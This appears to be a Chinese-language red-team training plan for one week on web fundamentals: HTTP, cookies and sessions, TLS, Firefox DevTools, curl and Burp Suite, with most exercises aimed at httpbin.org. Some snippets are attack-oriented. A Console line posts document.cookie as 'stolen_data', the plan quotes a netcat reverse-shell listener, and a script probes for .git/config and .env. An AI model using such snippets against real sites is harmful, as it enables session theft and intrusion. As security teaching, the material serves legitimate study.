@@ -1,0 +1,727 @@
+================================================================================
+第9周：Web基础 (Web入门期)
+================================================================================
+
+【本周围绕的核心渗透案例阶段】
+阶段三：漏洞分析与利用 (Vulnerability Analysis & Exploitation) —— Web渗透基石
+在完成侦察和扫描后，红队队员面对最常见的攻击面：Web应用。绝大多数企业
+的边界入口都是Web端口(80/443)。完整学习手册经典案例的操作8-10中，
+Apache 2.4.49的路径穿越RCE漏洞、Jenkins的Web控制台都是典型的Web攻击入口。
+本周聚焦HTTP协议的深层次理解、Cookie/Session机制、浏览器开发者工具和
+Burp Suite代理拦截——这些是Web渗透测试的绝对基础。
+引用：红队队员完整学习手册 → 三、经典渗透案例 → 阶段三: 漏洞分析与利用
+"操作9: Web应用扫描 → whatweb/nikto/dirb
+ 操作10: 利用Apache RCE获取初始Shell → nc -lvp 4444 接收连接"
+
+【本周学习目标】
+1. 深入理解HTTP请求/响应的完整结构（请求行/头/体）
+2. 掌握HTTPS/TLS加密原理和握手过程
+3. 深入理解Cookie/Session认证机制及其安全缺陷
+4. 熟练使用Firefox开发者工具分析HTTP流量
+5. 熟练使用curl进行命令行HTTP交互测试
+6. 安装并掌握Burp Suite代理拦截和请求修改
+
+【本周知识清单】
+• HTTP/1.1请求的结构：请求行(方法+URI+版本)、请求头(30+种)、请求体(GET为空/POST含数据)
+• HTTP/1.1请求方法语义：GET(获取)/POST(创建)/PUT(替换)/DELETE(删除)/PATCH(部分修改)/OPTIONS(支持的方法)/HEAD(只取头)
+• HTTPS/TLS 1.3握手过程：ClientHello → ServerHello+证书 → 密钥交换 → Finished
+• TLS证书验证链：根CA证书 → 中间CA证书 → 服务器证书
+• Cookie机制：Set-Cookie响应头、Domain/Path/Expires/Max-Age/Secure/HttpOnly/SameSite属性
+• Session机制：Cookie中的SessionID → 服务端Session存储 → 用户状态维护
+• 会话安全缺陷：Session固定攻击、Session劫持(XSS窃取)、不安全的Session ID生成
+• 同源策略(Same-Origin Policy)：协议+域名+端口三者一致
+• CORS跨域资源共享：Access-Control-Allow-Origin头的作用
+• JavaScript操作Cookie：document.cookie的读写及HttpOnly标志的保护
+• Firefox开发者工具(F12)：Network面板(HTTP流量)、Console面板(JS调试)、Storage面板(Cookie/Storage)
+• Burp Suite代理原理：中间人代理，拦截并修改浏览器和服务器之间的HTTP通信
+• Burp Suite核心模块：Proxy(代理拦截)/Repeater(请求重放)/Intruder(自动化攻击)/Decoder(编码解码)
+
+【本周工具清单】
+• curl (命令行HTTP客户端)
+• Firefox Developer Tools (浏览器调试和分析)
+• Burp Suite Community Edition (Web渗透核心工具)
+• OpenSSL s_client (TLS连接测试)
+• DVWA (Damn Vulnerable Web Application - 后续学习目标)
+
+================================================================================
+周一：HTTP协议请求/响应详解
+================================================================================
+
+📚 第1小时 | 理论学习 (19:00 - 20:00)
+  学习内容：HTTP请求的完整解剖——请求行(request line)包含三个部分：
+  请求方法(GET/POST/PUT/DELETE/HEAD/OPTIONS/PATCH)、请求URI(统一资源标识符)、
+  HTTP版本(HTTP/1.1或HTTP/2)。请求头(Request Headers)是键值对形式，
+  常见的有：Host(目标主机名，HTTP/1.1必须)、User-Agent(客户端标识)、
+  Accept(可接受的响应类型)、Cookie(发送之前存储的Cookie)、
+  Referer(来源URL)、Authorization(认证凭据)、Content-Type(请求体类型)、
+  Content-Length(请求体大小)。请求体(Body)包含实际提交的数据，
+  格式由Content-Type决定：application/x-www-form-urlencoded(表单默认)、
+  multipart/form-data(文件上传)、application/json(API调用)。
+  红队视角：理解HTTP结构才能构造精准的Web攻击载荷——SQL注入在参数中、
+  命令注入在头部或参数中、路径穿越在URI中。
+  参考文件：/home/a/成长为一个红队/网安基础知识/02-Web技术基础.txt（阅读第2章: HTTP协议深度解析）
+  参考文件：/home/a/成长为一个红队/archstrike-web教学/01-Web基础与HTTP协议.txt（阅读第一部分: HTTP协议详解）
+
+💻 第2小时 | 动手实践 (20:00 - 21:00)
+  练习内容：使用curl+Firefox开发者工具深入分析HTTP请求响应的每一个细节。
+  参考文件：/home/a/成长为一个红队/archstrike-web教学/01-Web基础与HTTP协议.txt
+
+  操作步骤：
+    Step 1: 使用curl查看完整HTTP通信
+      # 查看完整的请求和响应(-v)
+      curl -v http://httpbin.org/get 2>&1 | head -30
+
+      # 只显示请求头(>表示发送的)
+      curl -v http://httpbin.org/get 2>&1 | grep "^>"
+
+      # 只显示响应头(<表示接收的)
+      curl -v http://httpbin.org/get 2>&1 | grep "^<"
+
+      # 发送自定义请求头
+      curl -v http://httpbin.org/headers \
+        -H "X-Custom-Header: RedTeam-Test" \
+        -H "User-Agent: Mozilla/5.0 (Red Team Scanner)"
+
+    Step 2: HTTP请求方法全面测试
+      curl -v -X GET http://httpbin.org/get                    # GET
+      curl -v -X POST http://httpbin.org/post -d "key=value"   # POST
+      curl -v -X PUT http://httpbin.org/put -d "key=value"     # PUT
+      curl -v -X DELETE http://httpbin.org/delete              # DELETE
+      curl -v -X OPTIONS http://httpbin.org                    # OPTIONS(查看支持的方法)
+      curl -v -X HEAD http://httpbin.org/get                   # HEAD(只取响应头)
+      curl -v -X PATCH http://httpbin.org/patch -d "key=val"   # PATCH
+
+    Step 3: 分析不同的Content-Type
+      # application/x-www-form-urlencoded (表单默认)
+      curl -v -X POST http://httpbin.org/post \
+        -d "username=admin&password=test123"
+
+      # multipart/form-data (文件上传)
+      echo "file content" > /tmp/test_upload.txt
+      curl -v -X POST http://httpbin.org/post \
+        -F "file=@/tmp/test_upload.txt" \
+        -F "description=my upload"
+
+      # application/json (REST API)
+      curl -v -X POST http://httpbin.org/post \
+        -H "Content-Type: application/json" \
+        -d '{"username":"admin","role":"administrator"}'
+
+    Step 4: HTTP响应结构分析
+      # 查看响应状态行 + 响应头 + 响应体
+      curl -v http://httpbin.org/get 2>&1
+      # 观察输出结构: 
+      #   < HTTP/1.1 200 OK          ← 状态行
+      #   < Date: ...                ← 响应头开始
+      #   < Content-Type: ...
+      #   <                          ← 空行(头体分隔)
+      #   { "args": {} ... }         ← 响应体(JSON)
+
+      # 只取响应体(静默模式)
+      curl -s http://httpbin.org/get | python3 -m json.tool
+
+    Step 5: 使用Firefox开发者工具分析HTTP
+      cat > ~/training/week9/firefox_f12_guide.txt << 'EOF'
+      Firefox开发者工具 Network面板 操作指南:
+
+      1. 打开Firefox → 按F12 → 选择 Network (网络) 标签页
+      2. 访问任意网站 (如 http://httpbin.org)
+      3. 观察每个请求的:
+         - 方法 (GET/POST)
+         - 状态码 (200/301/404)
+         - 类型 (html/css/js/json)
+         - 大小 (请求和响应)
+         - 时间线 (DNS查询→TCP连接→TLS握手→请求→响应)
+
+      4. 点击任意请求查看详情:
+         - Headers (请求头+响应头)
+         - Cookies (请求Cookie+响应Set-Cookie)
+         - Params (URL参数)
+         - Response (响应体，可切换Raw/Preview)
+
+      5. 实验: 在地址栏访问 https://httpbin.org/status/200
+         观察Network面板中记录的所有资源加载过程
+      EOF
+      cat ~/training/week9/firefox_f12_guide.txt
+
+📝 第3小时 | 复盘总结 (21:00 - 22:00)
+  - 今日收获：深入理解了HTTP请求和响应的完整结构，学会了使用curl和Firefox开发者工具分析HTTP流量
+  - 遇到问题：(记录curl命令参数混淆、响应解析困难等)
+  - 明日计划：学习Cookie/Session机制和HTTPS
+
+================================================================================
+周二：Cookie/Session机制 + HTTPS
+================================================================================
+
+📚 第1小时 | 理论学习 (19:00 - 20:00)
+  学习内容：Cookie是存储在浏览器端的小型数据文件，由服务器通过Set-Cookie
+  响应头设置，浏览器在后续请求中自动附带Cookie头。Cookie属性详解：
+  Domain(生效域名范围)、Path(生效路径范围)、Expires/Max-Age(有效期)、
+  Secure(仅HTTPS传输)、HttpOnly(禁止JavaScript读取，防XSS窃取)、
+  SameSite(跨站请求时是否发送，防CSRF)。Session是服务器端的状态管理
+  机制，通常的工作方式：用户登录→服务器生成唯一Session ID→通过
+  Set-Cookie: PHPSESSID=abc123发送给浏览器→浏览器在后续请求中
+  携带此Cookie→服务器根据Session ID查找对应的用户状态。
+  HTTPS安全：TLS握手(非对称加密交换会话密钥 → 对称加密传输数据)，
+  证书验证(证书链从服务器证书到根CA的信任验证)。
+  参考文件：/home/a/成长为一个红队/网安基础知识/02-Web技术基础.txt（阅读第3-5章: HTTPS/TLS、Cookie机制、Session机制）
+  参考文件：/home/a/成长为一个红队/archstrike-web教学/01-Web基础与HTTP协议.txt（第二部分: HTTPS与TLS、Cookie/Session）
+
+💻 第2小时 | 动手实践 (20:00 - 21:00)
+  练习内容：通过curl和Firefox观察Cookie/Session的完整交互过程。
+  使用openssl s_client查看TLS握手细节。
+  参考文件：/home/a/成长为一个红队/archstrike-web教学/01-Web基础与HTTP协议.txt
+
+  操作步骤：
+    Step 1: Cookie设置和发送全流程观察
+      # 使用curl观察Cookie的Set和发送
+      curl -v -c /tmp/cookies.txt http://httpbin.org/cookies/set?username=admin 2>&1 | grep -i cookie
+      cat /tmp/cookies.txt
+
+      # 发送刚保存的Cookie
+      curl -v -b /tmp/cookies.txt http://httpbin.org/cookies 2>&1 | grep -i cookie
+
+      # 手动设置多个Cookie
+      curl -v -b "session=abc123; theme=dark" http://httpbin.org/cookies 2>&1
+
+    Step 2: Cookie属性实战测试
+      # 测试Secure属性(HTTPS-only Cookie)
+      curl -v -c /tmp/secure_cookies.txt \
+        https://httpbin.org/cookies/set?secure_flag/value 2>&1 | grep -i "set-cookie"
+
+      # 测试HttpOnly属性(禁止JS读取)
+      curl -v http://httpbin.org/cookies/set?httponly_test/value 2>&1 | grep -i "set-cookie"
+
+      # 测试SameSite属性
+      curl -v http://httpbin.org/cookies/set?samesite_test/value 2>&1 | grep -i "set-cookie"
+
+    Step 3: Session机制实践(模拟用户会话)
+      # 创建一个"会话"——在多个请求中保持Cookie
+      echo "[*] 第一次请求: 登录(设置session)"
+      curl -c /tmp/session_cookies.txt \
+        http://httpbin.org/cookies/set?session_id=REDTEAM123456 2>/dev/null
+
+      echo "[*] 第二次请求: 访问用户页面(携带session)"
+      curl -b /tmp/session_cookies.txt \
+        http://httpbin.org/cookies 2>/dev/null
+
+      echo "[*] 第三次请求: 修改密码(同session)"
+      curl -b /tmp/session_cookies.txt \
+        -X POST http://httpbin.org/post -d "new_password=REDTEAM456" 2>/dev/null
+
+      # 会话在多次请求中保持一致 ← 这就是Web应用跟踪用户状态的方式
+
+    Step 4: HTTPS/TLS握手分析
+      # 使用openssl查看TLS握手和证书详情
+      echo | openssl s_client -connect httpbin.org:443 -showcerts 2>/dev/null | head -40
+
+      # 只查看证书信息
+      echo | openssl s_client -connect httpbin.org:443 2>/dev/null | \
+        openssl x509 -noout -text | head -30
+
+      # 查看证书的主题和颁发者
+      echo | openssl s_client -connect httpbin.org:443 2>/dev/null | \
+        openssl x509 -noout -subject -issuer -dates
+
+      # curl查看TLS版本和密码套件
+      curl -v https://httpbin.org/get 2>&1 | grep -E "TLS|SSL|protocol"
+
+    Step 5: Cookie安全分析
+      cat > ~/training/week9/cookie_security.txt << 'EOF'
+      Cookie安全属性分析
+      =========================================
+      安全属性:
+        Secure:     Cookie只在HTTPS连接中传输
+        HttpOnly:   Cookie不能被JavaScript读取(防XSS窃取)
+        SameSite:   Strict(完全禁止跨站)/Lax(部分允许)/None(无限制)
+        Domain:     限制Cookie生效的域名范围
+        Path:       限制Cookie生效的路径范围
+
+      常见Cookie安全缺陷:
+        1. 缺少Secure标志 → 中间人攻击窃取Cookie
+        2. 缺少HttpOnly标志 → XSS可读取Cookie(document.cookie)
+        3. SameSite=None → CSRF攻击可行性
+        4. Domain设置过宽 → 子域名Cookie劫持
+        5. Session ID可预测 → 会话固定攻击
+        6. Session ID在URL中传递 → Referer泄露/代理日志泄露
+        7. 注销后Session未销毁 → 会话重放攻击
+      EOF
+      cat ~/training/week9/cookie_security.txt
+
+📝 第3小时 | 复盘总结 (21:00 - 22:00)
+  - 今日收获：深入理解了Cookie/Session的认证机制和安全隐患，掌握了HTTPS/TLS握手原理
+  - 遇到问题：(记录Cookie路径/域混淆、TLS证书验证失败等)
+  - 明日计划：Firefox开发者工具精通
+
+================================================================================
+周三：Firefox开发者工具精通
+================================================================================
+
+📚 第1小时 | 理论学习 (19:00 - 20:00)
+  学习内容：Firefox开发者工具(F12)是Web渗透测试最常用的浏览器内分析工具。
+  核心面板：Inspector(HTML/CSS元素检查，查看隐藏字段和DOM修改)、
+  Console(JavaScript执行环境，测试XSS payload和JS脚本)、
+  Debugger(JavaScript断点调试，分析前端验证逻辑)、
+  Network(网络流量分析——渗透测试中最重要的面板，记录所有HTTP请求/响应、
+  查看请求头/Cookie/参数/响应体/时间线)、Storage(查看Cookie/LocalStorage/
+  SessionStorage，分析认证令牌和客户端存储)、
+  Application(Service Worker/Manifest等)。Network面板是Web渗透的第一利器：
+  可以清楚看到AJAX请求的API端点、表单提交的参数格式、隐藏的请求头、
+  Cookie在请求中的传递方式。
+  参考文件：/home/a/成长为一个红队/archstrike-web教学/01-Web基础与HTTP协议.txt（第三部分: 浏览器开发者工具）
+
+💻 第2小时 | 动手实践 (20:00 - 21:00)
+  练习内容：通过实际操作Firefox开发者工具分析一个复杂网站的HTTP通信。
+  使用Console面板测试JavaScript代码，使用Storage面板分析Cookie/LocalStorage。
+  参考文件：/home/a/成长为一个红队/archstrike-web教学/01-Web基础与HTTP协议.txt
+
+  操作步骤：
+    Step 1: Network面板 - HTTP流量分析
+      # 打开Firefox → F12 → Network面板
+      # 保持DevTools打开，访问 http://httpbin.org/forms/post
+      # 观察所有网络请求，包括:
+      #   - 主HTML页面请求
+      #   - JS/CSS/图片等静态资源请求
+      #   - 任何AJAX/Fetch请求
+
+      # 填写表单并提交，观察POST请求的:
+      #   - Request Headers (Content-Type: application/x-www-form-urlencoded)
+      #   - Form Data (你填写的表单字段)
+      #   - Response (服务器返回的响应)
+
+      # 使用过滤功能:
+      #   - 过滤器栏输入 "post" → 只显示post相关请求
+      #   - 点击 XHR 标签 → 只显示AJAX/Fetch请求
+      #   - 点击 JS → 只显示JavaScript文件
+
+    Step 2: Console面板 - JavaScript交互
+      # 在Console中执行以下命令（观察结果）:
+      cat > ~/training/week9/console_commands.js << 'JSEOF'
+      // 在Firefox Console中逐条执行:
+
+      // 1. 查看当前页面的所有Cookie
+      document.cookie
+
+      // 2. 查看当前URL和域名
+      document.location.href
+
+      // 3. 获取所有输入框
+      document.querySelectorAll('input')
+
+      // 4. 获取所有链接
+      document.querySelectorAll('a')
+
+      // 5. 获取页面标题
+      document.title
+
+      // 6. 修改页面内容(模拟XSS效果)
+      document.querySelector('h1').innerText = "Hacked by Red Team"
+
+      // 7. 发送一个fetch请求(模拟CSRF)
+      fetch('http://httpbin.org/post', {
+        method: 'POST',
+        body: 'stolen_data=' + document.cookie
+      })
+
+      // 8. 查看localStorage
+      localStorage.length
+      Object.keys(localStorage)
+
+      // 9. 查看sessionStorage
+      sessionStorage.length
+      JSEOF
+      cat ~/training/week9/console_commands.js
+
+    Step 3: Storage面板 - 客户端存储分析
+      # 打开Storage面板，观察:
+      #   - Cookies: 列出所有Cookie及其属性
+      #   - Local Storage: 键盘存储的数据(永不过期)
+      #   - Session Storage: 会话存储的数据(关闭标签页即过期)
+      #   - IndexedDB: 大型结构化数据存储
+
+      # 在httpbin.org上设置Cookie观察:
+      # 访问 http://httpbin.org/cookies/set?test=redteam_value
+      # 然后在Storage面板中右键刷新，查看新出现的test Cookie
+
+    Step 4: Inspector面板 - DOM分析
+      # 在任意网页中练习:
+      #   - 右键 → Inspect Element (检查元素)
+      #   - 在Inspector中右键元素 → Edit as HTML (修改HTML)
+      #   - 查找隐藏字段: 搜索 type="hidden"
+      #   - 查看元素的事件监听器
+
+      # 红队重点检查:
+      #   - <input type="hidden"> 隐藏字段(可能包含敏感信息/CSRF Token)
+      #   - 注释中的敏感信息 <!-- password: xxx -->
+      #   - data-* 自定义属性中的信息
+
+    Step 5: 综合分析练习
+      cat > ~/training/week9/devtools_workflow.txt << 'EOF'
+      Web渗透测试 - Firefox开发者工具标准工作流:
+
+      1. Network面板 (最重要)
+         目的: 了解所有HTTP请求的详细信息
+         操作: 清空历史 → 执行操作(登录/搜索/上传) → 分析请求
+         关注: API端点、参数格式、认证方式(Cookie/Token/Basic)
+
+      2. Storage面板
+         目的: 分析身份认证机制和客户端数据
+         操作: 查看Cookie的HttpOnly/Secure属性
+         关注: 明文密码存储、敏感Token、不安全配置
+
+      3. Console面板
+         目的: 执行JS测试、调试XSS payload
+         操作: 执行document.cookie查看可读Cookie
+         关注: JS错误信息(可能泄露路径/框架版本)
+
+      4. Inspector面板
+         目的: 分析HTML源码和DOM结构
+         操作: 搜索隐藏字段、查看注释
+         关注: CSRF Token、禁用但存在的功能、敏感注释
+
+      5. Debugger面板
+         目的: 分析前端JS验证逻辑
+         操作: 设置断点、单步执行
+         关注: 绕过前端验证(密码复杂度/文件类型限制)
+      EOF
+      cat ~/training/week9/devtools_workflow.txt
+
+📝 第3小时 | 复盘总结 (21:00 - 22:00)
+  - 今日收获：熟练掌握了Firefox开发者工具的5大面板，理解了每个面板在Web渗透中的应用场景
+  - 遇到问题：(记录Console执行错误、Network面板不显示某些请求等)
+  - 明日计划：curl命令行HTTP操作精通
+
+================================================================================
+周四：curl命令行HTTP操作
+================================================================================
+
+📚 第1小时 | 理论学习 (19:00 - 20:00)
+  学习内容：curl是命令行HTTP客户端的瑞士军刀，在渗透测试中用于自动化测试、
+  编写PoC脚本和与Web服务交互。核心功能分类：HTTP方法操作(GET/POST/PUT/
+  DELETE)、头操控(-H自定义头/-A User-Agent/-e Referer)、认证支持
+  (-u Basic认证/--digest Digest认证/--ntlm NTLM认证)、Cookie管理
+  (-c保存Cookie/-b发送Cookie)、代理设置(-x http://proxy:port)、
+  重定向控制(-L跟随/-I只取头)、SSL控制(-k忽略证书错误/--cert客户端证书)、
+  输出控制(-o输出到文件/-O远程文件名/-w格式化输出)。curl的输出格式控制
+  (-w)在脚本中特别有用：%{http_code}状态码/%{time_total}总时间/
+  %{size_download}下载大小，可以精确测试Web应用的各种特性。
+  参考文件：/home/a/成长为一个红队/archstrike-web教学/01-Web基础与HTTP协议.txt（第四部分: curl命令行HTTP交互）
+
+💻 第2小时 | 动手实践 (20:00 - 21:00)
+  练习内容：使用curl进行各种Web渗透相关的HTTP操作。
+  编写一个curl自动化HTTP测试脚本。
+  参考文件：/home/a/成长为一个红队/archstrike-web教学/01-Web基础与HTTP协议.txt
+
+  操作步骤：
+    Step 1: curl输出格式控制(-w参数)
+      # 创建格式模板文件
+      cat > /tmp/curl_format.txt << 'EOF'
+      HTTP状态码: %{http_code}
+      总时间:     %{time_total}s
+      DNS解析:    %{time_namelookup}s
+      TCP连接:    %{time_connect}s
+      TLS握手:    %{time_appconnect}s
+      首字节:     %{time_starttransfer}s
+      下载大小:   %{size_download} bytes
+      重定向URL:  %{redirect_url}
+      有效URL:    %{url_effective}
+      EOF
+
+      # 使用格式模板测试
+      curl -w "@curl_format.txt" -o /dev/null -s http://httpbin.org/get
+
+      # 直接使用-w参数
+      curl -o /dev/null -s -w "状态码: %{http_code} | 时间: %{time_total}s\n" http://httpbin.org/get
+
+    Step 2: curl各种认证方式测试
+      # Basic认证 (base64编码的用户名:密码)
+      curl -v -u admin:password http://httpbin.org/basic-auth/admin/password
+
+      # Bearer Token认证 (JWT等现代API常用)
+      curl -v -H "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.test" \
+        http://httpbin.org/bearer
+
+      # API Key认证
+      curl -v -H "X-API-Key: abc123secret" http://httpbin.org/headers
+
+    Step 3: curl文件上传和下载
+      # 多文件上传
+      dd if=/dev/urandom of=/tmp/file1.bin bs=1K count=10 2>/dev/null
+      dd if=/dev/urandom of=/tmp/file2.bin bs=1K count=10 2>/dev/null
+
+      curl -v -F "file1=@/tmp/file1.bin" \
+        -F "file2=@/tmp/file2.bin" \
+        -F "description=dual upload test" \
+        http://httpbin.org/post
+
+      # 模拟大文件上传(速率限制)
+      curl --limit-rate 100K -F "file=@/tmp/file1.bin" http://httpbin.org/post
+
+    Step 4: curl代理和SSL操作
+      # 通过代理发送请求
+      # curl -x http://127.0.0.1:8080 http://target.com
+
+      # 忽略SSL证书错误(自签名证书测试)
+      curl -k https://self-signed.badssl.com/ 2>&1
+
+      # 查看SSL证书详情
+      curl -vI https://httpbin.org 2>&1 | grep -E "SSL|subject|issuer|expire"
+
+      # 指定TLS版本
+      curl --tlsv1.2 https://httpbin.org/get 2>&1
+      curl --tls-max 1.2 https://httpbin.org/get 2>&1
+
+    Step 5: curl自动化Web测试脚本
+      cat > ~/training/week9/curl_web_tester.sh << 'EOF'
+      #!/bin/bash
+      # curl Web自动化测试脚本
+
+      TARGET="${1:-http://httpbin.org}"
+
+      echo "=== Web测试: $TARGET ==="
+      echo ""
+
+      # 1. 测试基本连通性
+      echo "[1] 连通性测试"
+      STATUS=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 5 "$TARGET")
+      echo "  状态码: $STATUS"
+
+      # 2. 获取响应头
+      echo "[2] 响应头分析"
+      curl -sI "$TARGET" 2>&1 | head -20
+      echo ""
+
+      # 3. 测试HTTP方法
+      echo "[3] HTTP方法测试"
+      for method in GET POST PUT DELETE OPTIONS; do
+          status=$(curl -s -o /dev/null -w "%{http_code}" -X $method "$TARGET" 2>/dev/null)
+          echo "  $method → $status"
+      done
+      echo ""
+
+      # 4. 常见敏感路径测试
+      echo "[4] 敏感路径检查"
+      for path in robots.txt sitemap.xml .git/config .env admin wp-admin; do
+          status=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/$path" 2>/dev/null)
+          if [ "$status" != "404" ] && [ "$status" != "000" ]; then
+              echo "  [+] /$path → $status (可能存在!)"
+          fi
+      done
+      echo ""
+
+      # 5. Web服务器识别
+      echo "[5] Web服务器识别"
+      curl -sI "$TARGET" 2>&1 | grep -i "server:" || echo "  未透露Server头"
+      echo "  响应时间: $(curl -s -o /dev/null -w '%{time_total}s' $TARGET)"
+      echo ""
+      echo "[+] 测试完成!"
+      EOF
+      chmod +x ~/training/week9/curl_web_tester.sh
+      ~/training/week9/curl_web_tester.sh http://httpbin.org
+
+📝 第3小时 | 复盘总结 (21:00 - 22:00)
+  - 今日收获：精通了curl的HTTP操作，能编写自动化Web测试脚本，理解了各种认证方式的curl实现
+  - 遇到问题：(记录SSL证书错误、代理配置问题等)
+  - 明日计划：Burp Suite入门
+
+================================================================================
+周五：Burp Suite入门（代理设置+拦截）
+================================================================================
+
+📚 第1小时 | 理论学习 (19:00 - 20:00)
+  学习内容：Burp Suite是Web渗透测试的核心工具，由PortSwigger公司开发。
+  社区版(免费)包含：Proxy(HTTP/HTTPS拦截代理)、Repeater(手动修改和重放
+  单个请求)、Decoder(URL/Base64/HTML等编码解码)、Intruder(受限版自动化攻击)、
+  Sequencer(Session令牌随机性分析)。代理工作原理：Burp作为中间人代理
+  (默认127.0.0.1:8080)，浏览器将流量发送到Burp → Burp可以拦截/修改/放行
+  请求 → 发送到目标服务器 → 接收响应 → 拦截/修改/放行响应 → 返回浏览器。
+  拦截模式(Intercept)：on时每个请求都需要手动Forward，off时自动放行。
+  Repeater是Burp中最常用的模块：可以无限次重复发送请求，每次手动修改任意
+  部分的参数、头、体。这是手动Web渗透测试的核心工作流。
+  参考文件：/home/a/成长为一个红队/archstrike-web教学/01-Web基础与HTTP协议.txt（第五部分: Burp Suite安装与配置）
+
+💻 第2小时 | 动手实践 (20:00 - 21:00)
+  练习内容：安装Burp Suite，配置浏览器代理，练习拦截和修改HTTP请求。
+  使用Repeater模块进行手动参数测试。
+  参考文件：/home/a/成长为一个红队/archstrike-web教学/01-Web基础与HTTP协议.txt
+
+  操作步骤：
+    Step 1: 安装Burp Suite社区版
+      sudo pacman -S burpsuite 2>/dev/null || echo "请从portswigger.net下载Burp Suite社区版"
+      # 或者使用yay从AUR安装
+      # yay -S burpsuite 2>/dev/null
+      # 启动Burp: burpsuite &
+
+    Step 2: 配置Burp代理
+      cat > ~/training/week9/burp_setup.txt << 'EOF'
+      Burp Suite 代理配置步骤:
+      =========================================
+
+      1. Burp Suite端:
+         - Proxy → Options → 确认代理监听在 127.0.0.1:8080
+         - 勾选 Running 复选框
+
+      2. Firefox端:
+         - 设置 → 搜索"代理" → 网络设置 → 手动代理配置
+         - HTTP代理: 127.0.0.1  端口: 8080
+         - 勾选 "也将此代理用于HTTPS"
+         - 点击确定
+
+      3. Burp CA证书安装(用于HTTPS拦截):
+         - 浏览器访问 http://burpsuite 或 http://127.0.0.1:8080
+         - 点击 "CA Certificate" 下载 cacert.der
+         - Firefox设置 → 隐私与安全 → 证书 → 查看证书
+         - 导入 → 选择下载的cacert.der
+         - 勾选 "信任此CA用于识别网站"
+
+      4. 测试代理:
+         - 在浏览器中访问任意HTTP网站
+         - 查看Burp Proxy → HTTP history 中是否出现请求
+         - 如果有请求记录 → 代理配置成功!
+      EOF
+      cat ~/training/week9/burp_setup.txt
+
+    Step 3: Burp拦截(Intercept)练习
+      # 实际在Burp Suite图形界面中操作:
+      cat > ~/training/week9/burp_intercept_guide.txt << 'EOF'
+      Burp拦截练习:
+      =========================================
+      1. 打开Burp → Proxy → Intercept → 确认 "Intercept is on"
+
+      2. 在Firefox中访问 http://httpbin.org/forms/post
+
+      3. Burp会拦截到请求:
+         - 观察请求行: POST /post HTTP/1.1
+         - 观察请求头: Host, User-Agent, Content-Type
+         - 观察请求体: 表单数据
+
+      4. 修改请求(在Burp中):
+         - 将User-Agent改为: "EvilBot/1.0"
+         - 在表单数据中添加新字段: &hacked=true
+         - 点击 Forward 放行请求
+
+      5. 在浏览器中观察服务器响应是否因修改而改变
+
+      6. 练习: 在拦截模式下，修改请求的参数值、
+         添加新的请求头、删除某些请求头，观察效果
+      EOF
+
+    Step 4: Burp Repeater练习
+      cat > ~/training/week9/burp_repeater_guide.txt << 'EOF'
+      Burp Repeater核心操作:
+      =========================================
+      1. 在Proxy → HTTP History中，右键任意请求 → Send to Repeater
+
+      2. 切换到Repeater标签页:
+         - 左侧: 请求编辑器(可修改)
+         - 点击 "Go" 发送请求
+         - 右侧: 响应查看器(原始/渲染/十六进制)
+
+      3. 练习: 测试参数 tampering (参数篡改)
+         - 发送一个GET请求到Repeater
+         - 在URL参数中尝试: ?id=1 → ?id=2 → ?id=admin
+         - 每次点击Go观察响应变化
+         - 这是发现IDOR(不安全直接对象引用)的基本方法!
+
+      4. 练习: 测试不同HTTP方法
+         - 在Repeater中将GET改为POST
+         - 将POST改为PUT
+         - 发送OPTIONS请求查看允许的方法
+
+      5. 练习: 修改请求头
+         - 测试Accept头修改: text/html → application/json
+         - 测试Host头攻击: 修改Host为其他域名
+         - 测试X-Forwarded-For绕过IP限制
+      EOF
+
+    Step 5: Burp实战 - 对httpbin进行完整测试
+      cat > ~/training/week9/burp_practice_plan.txt << 'EOF'
+      Burp Suite入门实战计划:
+      =========================================
+      目标: http://httpbin.org
+
+      任务1: 拦截GET /get请求
+         - 修改Accept头为 application/xml
+         - Forward观察响应是否变为XML
+         - 记录结果
+
+      任务2: 在Repeater中测试POST参数
+         - 发送POST /post请求
+         - 修改username参数的值
+         - 添加新参数 role=admin
+         - 观察JSON响应中的变化
+
+      任务3: 使用Repeater测试状态码
+         - 请求 /status/200 → 观察200响应
+         - 请求 /status/403 → 观察403响应
+         - 请求 /status/500 → 观察服务器错误
+
+      任务4: 测试Cookie篡改
+         - 先在请求中设置Cookie: free_trial_user=true
+         - 发送到Repeater
+         - 修改Cookie为: free_trial_user=false 或 admin=true
+         - 观察响应(虽然httpbin不做权限检查，但理解cookie篡改原理)
+
+      任务5: 使用Decoder模块
+         - 将 "admin:password" Base64编码 → YWRtaW46cGFzc3dvcmQ=
+         - 解码 URL编码的字符串: %3Cscript%3Ealert(1)%3C%2Fscript%3E
+         - 理解渗透测试中频繁的编码/解码需求
+      EOF
+
+📝 第3小时 | 复盘总结 (21:00 - 22:00)
+  - 今日收获：成功安装并配置了Burp Suite，掌握了代理拦截和Repeater的核心操作
+  - 遇到问题：(记录Burp证书安装问题、代理无法拦截HTTPS、端口冲突等)
+  - 明日计划：周六复习日
+
+================================================================================
+周六：复习日
+================================================================================
+  上午 (2小时)：回顾本周所有Web基础知识
+    - 用curl完整测试HTTP所有请求方法(GET/POST/PUT/DELETE/HEAD/OPTIONS/PATCH)
+    - 用Burp Suite对httpbin.org做一次完整的代理拦截测试
+    - 在Firefox开发者工具中分析3个不同网站的HTTP流量差异
+    - 整理HTTP请求头的红队利用点清单
+
+  下午 (1小时)：在HackTheBox/TryHackMe上做相关挑战
+    - TryHackMe Room: HTTP in detail
+    - TryHackMe Room: Burp Suite: The Basics
+    - TryHackMe Room: OWASP Top 10 (入门)
+
+  晚间：整理本周笔记
+    - 制作HTTP请求/响应结构图
+    - 整理curl常用命令速查表(20个最常用参数)
+    - 整理Burp Suite工作流SOP
+    - 归档Cookie/Session安全分析清单
+
+================================================================================
+周日：休息日
+================================================================================
+  体能训练 | 自由活动 | 补充睡眠
+
+================================================================================
+【本周资源清单】
+================================================================================
+理论知识文件：
+  • /home/a/成长为一个红队/网安基础知识/02-Web技术基础.txt（第2-5章: HTTP协议、HTTPS/TLS、Cookie、Session）
+  • /home/a/成长为一个红队/archstrike-web教学/01-Web基础与HTTP协议.txt（全部）
+
+实践教程文件：
+  • /home/a/成长为一个红队/archstrike-web教学/01-Web基础与HTTP协议.txt（全部）
+  • /home/a/成长为一个红队/网安基础知识/02-Web技术基础.txt
+
+在线练习：
+  • TryHackMe Room: HTTP in detail
+  • TryHackMe Room: Burp Suite: The Basics
+  • TryHackMe Room: OWASP Top 10 (入门)
+  • httpbin.org (HTTP实验平台)
+  • Metasploitable2的Web应用(DVWA/mutillidae)
+
